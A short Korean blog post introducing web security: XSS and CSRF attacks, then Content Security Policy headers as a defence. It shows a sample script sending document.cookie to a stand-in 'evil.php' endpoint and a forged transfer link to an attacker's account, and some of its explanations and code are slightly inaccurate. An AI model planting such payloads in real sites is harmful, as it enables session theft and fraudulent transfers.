---
title: "웹 보안"
date: "2021-06-03"

---

개방형 웹 앱에서는 보안을 확인하는 것이 중요하다. 유저의 개인정보가 유출될수도 있고, 인터넷 은행 같은 서비스에서는 자산적 피해로 이어질 수 있다. 그래서 이 포스트에선 **웹 공격**과 **웹 보안**에 대해 알아보고자 한다.

## 웹 공격

웹 공격에는 대표적으로 두 가지가 있다. 

- [XSS](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting): 세션 하이재킹을 통해 서버와 요청 응답을 주고 받는 공격

```html
<--! 다음과 같은 코드를 공격 웹 사이트에 심어놓음으로 인해 cookie를 evil.php로 전송하여 탈취 -->
<SCRIPT type="text/javascript">
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
</SCRIPT>
```

- [CSRF](https://developer.mozilla.org/en-US/docs/Glossary/CSRF): 인증된 사용자를 통해 원하는 요청을 전송하는 공격

```html
<--! www.example.com/transfer이 송금이고 공격받는 사용자가 인증되었다고 가정했을 때 -->
<--! input 검사를 하지 않는 FAQ 같은 곳에 삽입할 수 있을 것이다. -->
<a href="www.example.com/transfer?account=attackerAccount&amount=$100">자세히 알아보기</a>
```



## 콘텐츠 보안 정책(CSP)

CSP는 XSS처럼 데이터를 삽입해 공격을 하는 막는 보안 계층이다.

일반적으로  [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) 헤더를 사용하고, <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';"> 이와 같이 meta 태그로 설정할 때도 있다.

가장 중요한 값은 default-src 인데, 이는 인라인 스크립트와 스타일이 실행되는 것을 방지한다. 아래 몇가지 예를 보면서 뜻을 알아보자.

예1) 모든 콘텐츠가 사이트 고유의 출처에서 제공되기를 원함.

```
Content-Security-Policy: default-src 'self'
```

예2) 이미지는 모든 곳에서 제공될 수 있지만, 스크립트는 지정된 서버에서만 허용.

```
Content-Security-Policy: default-src 'self'; img-src *; script-src userscripts.example.com
```

이처럼 리소스 출처에 제한을 두면서 공격에 대처하는 방법이다.



### 

